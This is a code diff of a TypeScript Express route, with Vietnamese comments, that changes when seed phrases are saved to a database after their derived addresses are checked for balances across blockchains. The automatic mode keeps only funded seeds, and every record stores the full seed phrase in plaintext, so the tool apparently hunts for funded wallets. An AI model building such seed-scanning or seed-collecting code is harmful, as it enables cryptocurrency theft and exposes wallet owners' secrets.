@@ -227,34 +227,58 @@ export async function registerRoutes(app: Express): Promise<Server> {
       console.log(`Hoàn thành kiểm tra ${addresses.length} địa chỉ song song trong ${endTime - startTime}ms`);
 
       // Lưu vào database theo quy tắc:
-      // - Nếu là kiểm tra thủ công: lưu TẤT CẢ địa chỉ (kể cả không có số dư)
-      // - Nếu là kiểm tra tự động: chỉ lưu địa chỉ có số dư
+      // - Với kiểm tra thủ công: Lưu seed phrase vào database với số dư của blockchain tương ứng.
+      //   Nếu không tìm thấy số dư ở bất kỳ blockchain nào, lưu DQCL một bản ghi với số dư = 0
+      // - Với kiểm tra tự động: Chỉ lưu seed phrase có số dư trên blockchain tương ứng
       if (seedPhrase) {
-        // Nếu là kiểm tra thủ công, chúng ta sẽ lưu seed phrase này
+        // Lọc ra các địa chỉ có số dư
+        const balanceAddresses = results.filter(r => r.hasBalance);
+        
+        // Với kiểm tra thủ công
         if (isManualCheck) {
-          console.log(`Đang lưu seed phrase thủ công với ${results.length} địa chỉ`);
-          
-          // Với kiểm tra thủ công, lưu tất cả địa chỉ kể cả không có số dư
-          for (const result of results) {
+          // Nếu có địa chỉ có số dư 
+          if (balanceAddresses.length > 0) {
+            console.log(`Đang lưu ${balanceAddresses.length} địa chỉ có số dư từ kiểm tra thủ công`);
+            
+            // Lưu mỗi địa chỉ có số dư với blockchain tương ứng
+            for (const result of balanceAddresses) {
+              try {
+                await storage.createWallet({
+                  blockchain: result.blockchain,
+                  address: result.address,
+                  balance: result.balance,
+                  seedPhrase: seedPhrase,
+                  path: "",
+                  isManualCheck: true, // Đánh dấu là thủ công
+                  metadata: {},
+                });
+              } catch (dbError) {
+                console.error(`Error saving manual wallet (${result.blockchain}) with balance to database:`, dbError);
+              }
+            }
+          } 
+          // Nếu không có địa chỉ nào có số dư, lưu một bản ghi để ghi nhận seed thủ công
+          else {
+            console.log(`Lưu seed phrase thủ công không có số dư`);
             try {
+              // Lưu DQCL một bản ghi với blockchain là từ địa chỉ đầu tiên hoặc "MANUAL"
+              const firstResult = results[0] || { blockchain: "MANUAL" as BlockchainType, address: "MANUAL" };
               await storage.createWallet({
-                blockchain: result.blockchain,
-                address: result.address,
-                balance: result.balance,
+                blockchain: firstResult.blockchain,
+                address: firstResult.address,
+                balance: "0",
                 seedPhrase: seedPhrase,
                 path: "",
                 isManualCheck: true, // Đánh dấu là thủ công
                 metadata: {},
               });
             } catch (dbError) {
-              console.error(`Error saving manual wallet (${result.blockchain}) to database:`, dbError);
-              // Tiếp tục ngay cả khi lưu DB thất bại
+              console.error(`Error saving manual wallet without balance to database:`, dbError);
             }
           }
         } 
-        // Nếu là kiểm tra tự động, chỉ lưu địa chỉ có số dư
+        // Với kiểm tra tự động, chỉ lưu địa chỉ có số dư
         else {
-          const balanceAddresses = results.filter(r => r.hasBalance);
           if (balanceAddresses.length > 0) {
             console.log(`Đang lưu ${balanceAddresses.length} địa chỉ có số dư từ kiểm tra tự động`);
             
@@ -271,7 +295,6 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 });
               } catch (dbError) {
                 console.error(`Error saving auto wallet (${result.blockchain}) with balance to database:`, dbError);
-                // Tiếp tục ngay cả khi lưu DB thất bại
               }
             }
           }
